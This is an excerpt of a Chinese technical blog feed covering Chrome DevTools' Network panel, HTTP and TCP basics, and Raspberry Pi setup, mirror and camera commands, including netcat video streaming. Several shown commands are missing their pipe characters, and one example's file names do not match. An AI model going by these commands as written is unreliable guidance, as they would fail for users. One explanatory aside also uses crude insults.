<h4 id="Requests-Table（请求列表）"><a href="#Requests-Table（请求列表）" class="headerlink" title="Requests Table（请求列表）"></a>Requests Table（请求列表）</h4><p>此列表列出了检索的每个资源。默认情况下，此表按时间顺序排序，也就是最早的资源在顶部。单击资源名称可以获得更多信息。提示：右键单击列表的任何标题栏可以以添加或删除信息列。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">捕获屏幕</span><br><span class="line">Controls 窗格包括的功能有网络日志录制、日志清理、捕获屏幕、过滤器，视图切换、保留日志开关、Cache开关、网络连接开关、网速阀值。</span><br><span class="line"></span><br><span class="line">以捕获屏幕为例，点击摄像机按钮（捕获屏幕），重新加载页面即可捕获屏幕。</span><br><span class="line"></span><br><span class="line">双击其中的截屏可以放大显示，在放大的图下方可以点击跳转到上一帧或者下一帧。</span><br><span class="line"></span><br><span class="line">单击则可以查看该帧被捕获时的网络请求信息，并且在Overview上会有一条黄色竖线以标记该帧被捕获的具体时间点。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Name 资源名称，点击名称可以查看资源的详情情况，包括Headers、Preview、Response、Cookies、Timing。</span><br><span class="line">Status HTTP状态码。</span><br><span class="line">Type 请求的资源MIME类型。</span><br><span class="line">Initiator 标记请求是由哪个对象或进程发起的（请求源）。</span><br><span class="line">Parser： 请求由Chrome的HTML解析器时发起的。</span><br><span class="line">Redirect：请求是由HTTP页面重定向发起的。</span><br><span class="line">Script：请求是由Script脚本发起的。</span><br><span class="line">Other：请求是由其他进程发起的，比如用户点击一个链接跳转到另一个页面或者在地址栏输入URL地址。</span><br><span class="line">Size 从服务器下载的文件和请求的资源大小。如果是从缓存中取得的资源则该列会显示(from cache)</span><br><span class="line">Time 请求或下载的时间，从发起Request到获取到Response所用的总时间。</span><br><span class="line">Timeline 显示所有网络请求的可视化瀑布流(时间状态轴)，点击时间轴，可以查看该请求的详细信息，点击列头则可以根据指定的字段可以排序。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Headers：与资源关联的 HTTP 标头。</span><br><span class="line"></span><br><span class="line">Preview：JSON、图像和文本资源的预览。</span><br><span class="line"></span><br><span class="line">Response：HTTP 响应数据（如果存在）。</span><br><span class="line"></span><br><span class="line">Timing：资源请求生命周期的精细分解。</span><br><span class="line"></span><br><span class="line">Headers（查看 HTTP 标头） </span><br><span class="line"></span><br><span class="line">点击 Headers 可以显示该资源的标头。 </span><br><span class="line"></span><br><span class="line">Headers 标签可以显示资源的请求网址、HTTP 方法以及响应状态代码。 此外，该标签还会列出 HTTP 响应和请求标头、它们的值以及任何查询字符串参数</span><br><span class="line"></span><br><span class="line">····可以自定义添加列····</span><br></pre></td></tr></table></figure>
<h4 id="查看-Cookie"><a href="#查看-Cookie" class="headerlink" title="查看 Cookie"></a>查看 Cookie</h4><p>点击 Cookies 标签可以查看在资源的 HTTP 请求和响应标头中传输的 Cookie 表。 只有传输 Cookie 时，此标签才可用。</p>
<p>下面是 Cookie 表中每一列的说明：</p>
<p>Name：Cookie 的名称。</p>
<p>Value：Cookie 的值。</p>
<p>Domain：Cookie 所属的域。</p>
<p>Path：Cookie 来源的网址路径。</p>
<p>Expires / Max-Age：Cookie 的 expires 或 max-age 属性的值。</p>
<p>Size：Cookie 的大小（以字节为单位）。</p>
<p>HTTP：指示 Cookie 应仅由浏览器在 HTTP 请求中设置，而无法通过 JavaScript 访问。</p>
<p>Secure：如果存在此属性，则指示 Cookie 应仅通过安全连接传输。</p>
<p>复制、保存和清除网络信息</p>
<h5 id="Copy-Response（复制响应）"><a href="#Copy-Response（复制响应）" class="headerlink" title="Copy Response（复制响应）"></a>Copy Response（复制响应）</h5><p>将所选资源的HTTP响应复制到系统剪贴板。</p>
<h5 id="Copy-as-cURL（复制为cURL）"><a href="#Copy-as-cURL（复制为cURL）" class="headerlink" title="Copy as cURL（复制为cURL）"></a>Copy as cURL（复制为cURL）</h5><p>将所选资源的网络请求作为cURL命令字符串复制到系统剪贴板。 请参阅将复制请求为cURL命令。</p>
<p>curl命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl可以祝一臂之力。l</p>
<h5 id="Copy-All-as-HAR（全部复制为HAR）"><a href="#Copy-All-as-HAR（全部复制为HAR）" class="headerlink" title="Copy All as HAR（全部复制为HAR）"></a>Copy All as HAR（全部复制为HAR）</h5><p>将所有资源复制到系统剪贴板作为HAR数据。 HAR文件包含描述网络“瀑布”的JSON数据结构。一些第三方工具可以使用HAR文件中的数据重建网络瀑布。有关详细信息，请参阅Web性能强大工具：HTTP归档（HAR）。</p>
<h5 id="Save-as-HAR-with-Content（另存为带内容的HAR）"><a href="#Save-as-HAR-with-Content（另存为带内容的HAR）" class="headerlink" title="Save as HAR with Content（另存为带内容的HAR）"></a>Save as HAR with Content（另存为带内容的HAR）</h5><p>将所有网络数据与每个页面资源一起保存到HAR文件中。 二进制资源（包括图像）被编码为Base64编码文本。</p>
<h5 id="Clear-Browser-Cache（清除浏览器缓存）"><a href="#Clear-Browser-Cache（清除浏览器缓存）" class="headerlink" title="Clear Browser Cache（清除浏览器缓存）"></a>Clear Browser Cache（清除浏览器缓存）</h5><p>清除浏览器高速缓存。提示：您也可以从Network Conditions(网络条件)抽屉式窗格中启用或禁用浏览器缓存。</p>
<h5 id="Clear-Browser-Cookies（清除浏览器Cookie）"><a href="#Clear-Browser-Cookies（清除浏览器Cookie）" class="headerlink" title="Clear Browser Cookies（清除浏览器Cookie）"></a>Clear Browser Cookies（清除浏览器Cookie）</h5><p>清除浏览器的Cookie。</p>
<h5 id="Open-in-Sources-Panel（在源文件面板中打开）"><a href="#Open-in-Sources-Panel（在源文件面板中打开）" class="headerlink" title="Open in Sources Panel（在源文件面板中打开）"></a>Open in Sources Panel（在源文件面板中打开）</h5><p>在Sources(源文件)面板中打开选定的资源。</p>
<h5 id="Open-Link-in-New-Tab（在新标签页中打开链接）"><a href="#Open-Link-in-New-Tab（在新标签页中打开链接）" class="headerlink" title="Open Link in New Tab（在新标签页中打开链接）"></a>Open Link in New Tab（在新标签页中打开链接）</h5><p>在新标签页中打开所选资源。您还可以在Requests Table(请求列表)中双击资源名称。</p>
<h5 id="Copy-Link-Address（复制链接地址）"><a href="#Copy-Link-Address（复制链接地址）" class="headerlink" title="Copy Link Address（复制链接地址）"></a>Copy Link Address（复制链接地址）</h5><p>将资源URL复制到系统剪贴板。</p>
<h5 id="Save（保存）"><a href="#Save（保存）" class="headerlink" title="Save（保存）"></a>Save（保存）</h5><p>保存所选的文本资源。仅显示在文本资源上。</p>
<h5 id="Replay-XHR（重新发送XHR）"><a href="#Replay-XHR（重新发送XHR）" class="headerlink" title="Replay XHR（重新发送XHR）"></a>Replay XHR（重新发送XHR）</h5><p>重新发送所选的XMLHTTPRequest。仅显示在XHR资源上。</p>
<p>查看资源发起者和依赖关系</p>
<p>按住Shift并移动鼠标到资源上可查看它的发起者和依赖关系。这部分是你鼠标悬停的资源的target(目标)引用。</p>
<p>从target(目标)往上查找，第一个颜色编码为绿色的资源是target(目标)的发起者。如果存在第二个颜色编码为绿色资源，那么这个是发起者的发起者。从target(目标)向下查找，任何颜色编码为红色的资源都是target的依赖。</p>
<h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><h3 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h3><p><a href="http://tool.oschina.net/commons?type=5" target="_blank" rel="noopener">参考</a></p>
<h3 id="URI与URL"><a href="#URI与URL" class="headerlink" title="URI与URL"></a>URI与URL</h3><p>URI：统一资源标示符，只是标识资源在哪里，这意味着存在多个URI可以指向该资源（例如：绝对与相对）【URI包含URL】</p>
<p>URI一般由三部分组成：<br>　　1. 访问资源的命名机制。<br>　　2. 存放资源的主机名。<br>　　3. 资源自身的名称，由路径表示。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：[scheme:] scheme-specific-part </span><br><span class="line"></span><br><span class="line">　　URI以scheme和冒号开头。Scheme用大写/小写字母开头，后面为空或者跟着更多的大写/小写字母、数字、加号、减号和点号。冒号把 scheme与scheme-specific-part分开了，并且scheme-specific-part的语法和语义（意思）由URI的名字空间决定。如下面的例子：</span><br><span class="line">　　http://www.cnn.com，其中http是scheme，//www.cnn.com是 scheme-specific-part，并且它的scheme与scheme-specific-part被冒号分开了。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绝对与相对：</span><br><span class="line"></span><br><span class="line">　　绝对的URI指以scheme（后面跟着冒号）开头的URI。(例如：mailto:jeff@javajeff.com、news:comp.lang.java.help和xyz: //whatever)；绝对的URI看作是以某种方式引用某种资源，而这种方式对标识符出现的环境没有依赖。</span><br><span class="line"></span><br><span class="line">　　相对的URI不是以scheme（后面跟着冒号）开始的URI。(例如：articles/articles.html、img/aa.jpg)你可以把相对的URI看作是以某种方式引用某种资源，而这种方式依赖于标识符出现的环境。（即你在html中引用图片：./img/aa.jpg，那么它依赖的就是http）</span><br></pre></td></tr></table></figure>
<p>URL：统一资源定位符，是URI的子集；它除了标识资源的位置，还提供一种定位该资源的主要访问机制(如其网络“位置”)。【即提供具体方式找到该资源（位置+方式）】</p>
<p>URL的格式由下列三部分组成：<br>　　1. 第一部分，是协议或称为服务方式 （指定低层使用的协议，例如：http, https, ftp)；<br>　　2. 第二部分，是存有该资源的主机IP地址（有时也包括端口号）；<br>　　3. 第三部分，是主机资源的具体地址。如目录和文件名等。 </p>
<p>　　第一部分和第二部分之间用”：//“符号隔开，第二部分和第三部分用”/“符号隔开。第一部分和第二部分是不可缺少的，第三部分有时可以省略。 </p>
<h3 id="三次握手四次挥手"><a href="#三次握手四次挥手" class="headerlink" title="三次握手四次挥手"></a>三次握手四次挥手</h3><p><img data-src="http://tuchuang.xchcloud.cn/789055-20170506162942976-381307940.jpg" alt></p>
<p>上图中主要分为三部分：建立连接、传输数据、断开连接。</p>
<h4 id="建立连接："><a href="#建立连接：" class="headerlink" title="建立连接："></a>建立连接：</h4><p>　　三次握手即可建立TCP连接</p>
<p>　　1、第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND状态，等待服务器确认；</p>
<p>　　2、第二次握手：服务器收到syn包，必须确认客户的SYN(ack=x+1)，同时自己也发送一个SYN包(seq=y)，即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
<p>　　3、第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</p>
<p>　　握手过程中传送的包里不包含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方中的任何一方主动关闭连接之前，TCP 连接都将被一直保持下去。</p>
<p>　　为什么需要三次握手呢？</p>
<p>　　相互确认！</p>
<h4 id="数据传输："><a href="#数据传输：" class="headerlink" title="数据传输："></a>数据传输：</h4><p>　　建立好连接后，开始传输数据。TCP数据传输牵涉到的概念很多：超时重传、快速重传、流量控制、拥塞控制等等。（这一切都是为了提供可靠的字节流服务）</p>
<h4 id="断开连接："><a href="#断开连接：" class="headerlink" title="断开连接："></a>断开连接：</h4><p>　　四次握手即可断开TCP连接</p>
<p>　　1、第一次握手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但此时主动关闭方还可以接受数据。</p>
<p>　　2、第二次握手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1(与SYN相同，一个FIN占用一个序号)。</p>
<p>　　3、第三次握手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。</p>
<p>　　4、第四次握手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">白话文：</span><br><span class="line"></span><br><span class="line">　　1、第一次握手，浏览器对服务器说：“煞笔，我不再给你发数据啦，但可以接受数据。”</span><br><span class="line"></span><br><span class="line">　　2、第二次握手，服务器对浏览器说：“骚货，我知道啦！”</span><br><span class="line"></span><br><span class="line">　　3、第三次握手，服务器对浏览器说：“骚货，我也不再给你发数据啦！”</span><br><span class="line"></span><br><span class="line">　　4、第四次握手，浏览器对服务器说：“煞笔，我知道啦！”</span><br></pre></td></tr></table></figure></p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>HTTP协议永远都是客户端发起请求，服务器回送响应。这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。、</p>
<p>主要特点：</p>
<p>　　1、支持客户/服务器模式。一旦建立了运输连接（这常常称为建立了会话），浏览器端就向万维网服务器端发送HTTP请求，服务器收到请求后给出HTTP响应。<br>　　2、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。<br>　　3、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。<br>　　4、<strong>HTTP 0.9和1.0使用非持续连接</strong>：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。<br><strong>HTTP 1.1使用持续连接</strong>：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用这种方式可以节省传输时间。<br>　　5、无状态：<strong>HTTP协议是无状态协议</strong>。即每一个HTTP请求都是独立的。万维网服务器不保存过去的请求和过去的会话记录。这就是说，同一个用户再次访问同一个服务器时，只要服务器没有进行内容的更新，服务器的响应就给出和以前被访问时相同的响应。<strong><em>服务器不记录曾经访问过的用户，也不记录某个用户访问过多少次。</em></strong></p>
<h3 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h3><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>　1、GET：向特定的资源发出请求</p>
<p>　　2、POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</p>
<p>　　3、PUT：向指定资源位置上传其最新内容。</p>
<p>　　4、DELETE：请求服务器删除Request-URI所标识的资源。</p>
<p>　　5、HEAD： 向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。该方法常用于测试超链接的有效性，是否可以访问，以及最近是否更新。</p>
<p>　　6、TRACE：请求服务器会送收到的请求信息，主要用于测试或诊断。</p>
<p>　　7、OPTIONS：请求查询服务器的性能，或者查询与资源相关的选项和需求</p>
<p>　　8、CONNECT： HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。（即留为将来使用）</p>
<p>　　【注意：请求方法区分大小写；所示请求方法应为大写】</p>
<h4 id="非持久连接方式"><a href="#非持久连接方式" class="headerlink" title="非持久连接方式"></a>非持久连接方式</h4><h4 id="持久连接方式"><a href="#持久连接方式" class="headerlink" title="持久连接方式"></a>持久连接方式</h4><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/LibraThinker/p/5981346.html" target="_blank" rel="noopener">Chrome开发者工具详解(2)-Network面板</a><br><a href="https://zhuanlan.zhihu.com/p/32825491" target="_blank" rel="noopener">Google Chrome抓包分析详解</a><br><a href="https://segmentfault.com/a/1190000008407729?utm_source=tag-newest" target="_blank" rel="noopener">Chrome DevTools — Network</a><br><a href="https://www.cnblogs.com/phpstudy2015-6/p/6810130.html" target="_blank" rel="noopener">HTTP协议详解以及URL具体访问过程</a></p>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派填坑系列</title>
    <url>/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%A1%AB%E5%9D%91%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h2 id="博客资料"><a href="#博客资料" class="headerlink" title="博客资料"></a>博客资料</h2><p><a href="http://wiki.nxez.com/" target="_blank" rel="noopener">创客百科</a><em>推荐</em><br><a href="https://www.cnblogs.com/jikexianfeng/category/853162.html" target="_blank" rel="noopener">极客先锋</a><br><a href="https://blog.csdn.net/u013162035/article/details/81841135" target="_blank" rel="noopener">OpenCV 开发笔记博文导航</a><br><a href="https://blog.csdn.net/xukai871105/article/category/1436049" target="_blank" rel="noopener">物联网 IoT 经验分享小站</a><br><a href="https://blog.csdn.net/u013162035/column/info/18279" target="_blank" rel="noopener">树莓派开发笔记</a><br><a href="https://steinslab.io/archives/category/projects" target="_blank" rel="noopener">SPtuan的个人实验地</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="http://maker.quwj.com/project/10" target="_blank" rel="noopener">Pi Dashboard (Pi 仪表盘)</a> <a href="https://github.com/spoonysonny/pi-dashboard" target="_blank" rel="noopener">github项目库</a></p>
<h3 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h3><hr>
<p><a href="http://maker.quwj.com/" target="_blank" rel="noopener">趣无尽</a></p>
<hr>
<p><a href="http://maker.quwj.com/project/78" target="_blank" rel="noopener">自动灌溉系统</a><br><a href="http://maker.quwj.com/project/60/" target="_blank" rel="noopener">用本地网络控制的树莓派摄影云台</a> Github：<a href="https://github.com/Mjrovai/WebCam-Pan-Tilt-Control-via-Flask" target="_blank" rel="noopener">https://github.com/Mjrovai/WebCam-Pan-Tilt-Control-via-Flask</a><br><a href="http://shumeipai.nxez.com/2017/03/14/server-monitoring-assistant-based-on-php-probe-and-python-crawler.html" target="_blank" rel="noopener">基于PHP探针和Python爬虫的服务器监控</a><br><a href="https://blog.csdn.net/xukai871105/article/details/38356755" target="_blank" rel="noopener">Python SQLite插入温度记录</a></p>
<hr>
<p><a href="http://maker.quwj.com/project/78" target="_blank" rel="noopener">树莓派+Arduino+TensorFlow搭建图像识别小车</a> :TensorFlow；模型训练<br><a href="http://shumeipai.nxez.com/2018/06/13/build-baby-monitor-raspberry-pi.html" target="_blank" rel="noopener">使用树莓派构建一个婴儿监视器</a> :<a href="https://opensource.com/article/18/3/build-baby-monitor-raspberry-pi" target="_blank" rel="noopener">原文参考 英文</a><br><a href="http://shumeipai.nxez.com/2018/03/09/real-time-face-recognition-an-end-to-end-project-with-raspberry-pi.html" target="_blank" rel="noopener">用树莓派实现实时的人脸检测</a> :<a href="https://github.com/Mjrovai/OpenCV-Face-Recognition" target="_blank" rel="noopener">项目地址</a><br><a href="http://shumeipai.nxez.com/2018/08/12/facial-recognition-identification-on-raspberry-pi.html" target="_blank" rel="noopener">在树莓派上实现人脸识别</a> :<a href="https://www.hackster.io/AdamMiltonBarker/facial-recognition-identification-on-raspberry-pi-1c7495" target="_blank" rel="noopener">参考链接 英文</a><br><a href="http://shumeipai.nxez.com/2017/12/25/not-santa-keras-deep-learning-raspberry-pi.html" target="_blank" rel="noopener">圣诞老人检测机：基于树莓派和 Keras 的深度学习 AI</a> :<a href="https://www.pyimagesearch.com/2017/12/18/keras-deep-learning-raspberry-pi/" target="_blank" rel="noopener">原文参考 英文</a><br><a href="http://shumeipai.nxez.com/2017/03/16/raspberry-pi-face-recognition-system.html" target="_blank" rel="noopener">使用树莓派进行简易人脸识别</a> : <a href="https://jireren.github.io/blog/2016/02/27/face-recognition-system-based-on-raspberry-pi-2/" target="_blank" rel="noopener">blog</a> + <a href="https://courses.ece.cornell.edu/ece5990/ECE5990_Fall15_FinalProjects/Andre_Heil/ece5990_final_report/avh34_jr986.html" target="_blank" rel="noopener">课程报告</a><br><a href="http://shumeipai.nxez.com/2017/07/02/dingdang-an-open-source-chinese-smart-speaker-project.html" target="_blank" rel="noopener">叮当：一个开源的树莓派中文智能音箱项目</a></p>
<hr>
<h2 id="密码123456"><a href="#密码123456" class="headerlink" title="密码123456"></a>密码123456</h2><p>pi<br>raspberry</p>
<p>改密码：</p>
<pre><code>
sudo passwd pi                           #修改 Pi 密码  
sudo passwd root                         #设置 root 密码    
su root                                  #切换到 root 用户  
su pi                                    #切换到 pi 用户 
</code></pre>


<h2 id="树莓派换源"><a href="#树莓派换源" class="headerlink" title="树莓派换源"></a>树莓派换源</h2><p><a href="https://mirror.tuna.tsinghua.edu.cn/help/raspbian/" target="_blank" rel="noopener"> 清华大学开源软件镜像站</a></p>
<p>使用管理员权限（经由sudo），编辑/etc/apt/sources.list文件。参考命令行为：</p>
<pre><code>$ sudo nano /etc/apt/sources.list</code></pre>

<p>用#注释掉原文件内容，用以下内容取代：<br><a id="more"></a></p>
<pre><code>deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi
deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</code></pre>

<p>使用管理员权限（经由sudo），编辑/etc/apt/sources.list.d/raspi.list文件。参考命令行为：</p>
<pre><code>$ sudo nano /etc/apt/sources.list.d/raspi.list</code></pre>

<p>用#注释掉原文件内容，用以下内容取代：</p>
<pre><code>deb http://mirror.tuna.tsinghua.edu.cn/raspberrypi/ stretch main ui
deb-src http://mirror.tuna.tsinghua.edu.cn/raspberrypi/ stretch main ui</code></pre>

<p>注意： 网址末尾的raspbian重复两次是必须的。因为Raspbian的仓库中除了APT软件源还包含其他代码。APT软件源不在仓库的根目录，而在raspbian/子目录下。</p>
<p>编辑镜像站后，请使用sudo apt-get update命令，更新软件源列表，同时检查您的编辑是否正确。</p>
<h2 id="摄像头安装"><a href="#摄像头安装" class="headerlink" title="摄像头安装"></a>摄像头安装</h2><ol>
<li>RPi固件和raspi-config已经为了摄像头更新，请执行一次apt-get update; apt-get upgrade;</li>
<li>raspi-config中选择camera，启动RPi固件中的摄像头驱动，然后重启</li>
<li>使用命令行程序raspivid和raspistill操作摄像头，捕捉视频片段或图像</li>
<li>捕捉到的视频片段需要用mplayer播放</li>
</ol>
<p><a href="https://www.rs-online.com/designspark/chi-pi-cam-setup-tutorial" target="_blank" rel="noopener">参考教程1</a><br><a href></a></p>
<h3 id="拍照"><a href="#拍照" class="headerlink" title="拍照"></a>拍照</h3><pre><code>$ raspistill -o 1.jpg -t 2000 </code></pre>
这句命令将在 2000ms 后拍摄一张照片，然后保存为 1.jpg。

raspiyuv 工具用法差不多，只不过拍摄得到的是一张未处理过的raw图像。

通过摄像头模块拍视频
想要用摄像头模块拍一段视频的话，可以从命令行运行 raspivid 工具。下面这句命令会按照默认配置(长度5秒，分辨率1920x1080，比特率 17Mbps)拍摄一段视频。

<pre><code>$ raspivid -o ex.h264</code></pre>

<p>如果你想改变拍摄时长，只要通过 “-t” 选项来设置你想要的长度就行了（单位是毫秒）。</p>
<pre><code>$ raspivid -o ex.h264 -t 10000</code></pre>

<p>使用 “-w” 和 “-h” 选项将分辨率降为 1280x720…</p>
<pre><code>$ raspivid -o ex.h264 -t 10000 -w 1280 -h 720</code></pre>

<p>raspivid 的输出是一段未压缩的 H.264 视频流，而且这段视频不含声音。为了能被通常的视频播放器所播放，这个 raw 的 H.264 视频还需要转换。可以使用 gpac 包中所带有的 MP4Box 应用。</p>
<p>在 Raspbian 上安装 gpac，输入命令：</p>
<pre><code>$ sudo apt-get install -y gpac </code></pre>
然后将这段 raw 的 H.264 格式的视频流转换为每秒30帧的 .mp4 格式视频：

<pre><code>$ MP4Box -fps 30 -add keychain.h264 keychain.mp4 </code></pre>
视频长度为10秒，使用默认分辨率以及比特率。下面是一段通过 Pi Camera 拍摄的一段实例视频。

### 如何将摄像头的数据通过网络直播播发出去：

通过nc命令（ncat - Concatenate and redirect sockets）将摄像头的输入数据，直接重定向到网络端口实现输出.
<pre><code>
How to stream video from the Raspberry Pi camera over a network

To view the feed on Linux

Install the dependencies by running the following in a terminal:

sudo apt-get install mplayer netcat

Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX).

Run the following command in a terminal to view the feed using MPlayer:

nc -l -p 5001   mplayer -fps 31 -cache 1024 -

To view the feed on Windows

Install and run Linux instead.

Find your IP address by running ipconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX).

Download MPlayer.

Download Netcat.

Note that your browser may complain that these files are malicious, as they are unsigned executables.

Press the Windows key and the ‘r’ key simultaneously to bring up the “Run” dialog. Enter cmd.exe into the dialog and press enter/return to open a DOS prompt.

Enter the following command at the prompt to view the feed using MPlayer:

[Path to nc.exe]\nc.exe -L -p 5001   [Path to mplayer.exe]\mplayer.exe -fps 31 -cache 1024 -

To view the feed on OS X

Download MPlayer.

Alternatively, you can download mplayer using Brew, which we recommend.

Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX).

Run the following command in Terminal to view the feed using MPlayer:

nc -l -p 5001   mplayer -fps 31 -cache 1024 -

To view the feed on a Raspberry Pi:

Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX).

Run the following commands in a terminal on the receiving Pi:

mkfifo buffer

nc -p 5001 -l > buffer   /opt/vc/src/hello_pi/hello_video/hello_video.bin buffer

To transmit the feed from the Pi with camera module attached

After setting up the “receiving” machine as per the instructions above, run the following commands in a terminal on the “transmitting” Pi:

raspivid -t 999999 -o –   nc [insert the IP address of the client] 5001


You can then use the commands listed in the “How to use the Raspberry Pi camera software” section above to change the capture time or to add a video effect.
</code></pre>

<h2 id="raspberryPi摄像头命令行软件raspistill帮助文档"><a href="#raspberryPi摄像头命令行软件raspistill帮助文档" class="headerlink" title="raspberryPi摄像头命令行软件raspistill帮助文档"></a>raspberryPi摄像头命令行软件raspistill帮助文档</h2><p><a href="http://shumeipai.nxez.com/2014/09/21/raspicam-documentation.html" target="_blank" rel="noopener">树莓派摄像头模块应用程序文档翻译[转]</a><br><a href="https://github.com/raspberrypi/userland/tree/master/host_applications/linux/apps/raspicam" target="_blank" rel="noopener">英文项目Github地址</a></p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre><code>
常用命令：
# 两秒钟（时间单位为毫秒）延迟后拍摄一张照片，并保存为 image.jpg
raspistill -t 2000 -o image.jpg

# 拍摄一张自定义大小的照片。
raspistill -t 2000 -o image.jpg -w 640 -h 480

# 降低图像质量，减小文件尺寸
raspistill -t 2000 -o image.jpg -q 5

# 强制使预览窗口出现在坐标为 100,100 的位置，并且尺寸为宽 300 和高 200 像素。
raspistill -t 2000 -o image.jpg -p 100,100,300,200

# 禁用预览窗口
raspistill -t 2000 -o image.jpg -n

# 将图像保存为 PNG 文件（无损压缩格式，但是要比 JPEG 速度慢）。注意，当选择图像编码时，文件扩展名将被忽略。
raspistill -t 2000 -o image.png –e png

# 向 JPEG 文件中添加一些 EXIF 信息。该命令将会把作者名称标签设置为 Dreamcolor，GPS 海拔高度为 123.5米。
raspistill -t 2000 -o image.jpg -x IFD0.Artist=Dreamcolor -x GPS.GPSAltitude=1235/10

# 设置浮雕风格图像特效
raspistill -t 2000 -o image.jpg -ifx emboss

# 设置 YUV 图像的 U 和 V 通道为指定的值（128:128 为黑白图像）
raspistill -t 2000 -o image.jpg -cfx 128:128

# 仅显示两秒钟预览图像，而不对图像进行保存。
raspistill -t 2000

# 间隔获取图片，在 10 分钟（10 分钟 = 600000 毫秒）的时间里，每 10 秒获取一张，并且命名为 image_number_1_today.jpg，image_number_2_today.jpg... 的形式。
raspistill -t 600000 -tl 10000 -o image_num_%d_today.jpg

# 获取一张照片并发送至标准输出设备
raspistill -t 2000 -o -

# 获取一张照片并保存为一个文件
raspistill -t 2000 -o - > my_file.jpg
</code></pre>

<h3 id="图像参数与命令"><a href="#图像参数与命令" class="headerlink" title="图像参数与命令"></a>图像参数与命令</h3><pre><code>
-?,  --help             : 帮助文档
-w,  --width            : 设置图像宽度 <尺寸>
-h, --height            : 设置图像高度 <尺寸>
-q, --quality           : 设置jpeg品质 <0到100>
-r, --raw               : 增加raw原始拜尔数据到JPEG元数据
-o, --output            : 输出文件名 <文件名>，如果要写到stdout，使用`-o -`，如果不特别指定，图像文件不会被保存
-l, --latest            : 链接最近的完整图像到指定文件 <文件名>
-v, --verbose           : 在运行摄像头时输出详细信息
-t, --timeout           : 拍照和关闭时的延时指定，未指定时默认是5s
-th, --thumb            : 设置预览图（小图）参数（包括X、Y、品质）或者不设置
-d, --demo              : 运行一个demo模式（cycle through range of camera options, no capture），括号里的我可以理解成循环测试模式吗？
-e, --encoding          : 编码来输出指定格式文件 （jpg, bmp, gif, png）
-x, --exif              :将可交换图像文件应用到捕获中（格式：`key=value`）或者不设置
-tl, --timelapse        : 间隔拍摄，每<ms>拍摄一张图片
-fp, --fullpreview      : 用静态捕捉分辨率运行预览（可能会减小预览帧率）
-k, --keypress          : 按键触发，按`ENTER`键拍照，按`X`然后`ENTER`键退出
-s, -signal             : 信号触发，等待另一个进程信号来拍摄一张照片
-g, -gl                 : 绘制预览到文本，而不是使用视频渲染组件（啥意思？）
-gc, --glcapture        : 捕获GL帧buffer而不是摄像机图像
-set, --settings        : 检索摄像机设置值然后写出到stdout
-cs, --camselect        : 选择摄像头设备 <数字>，默认0
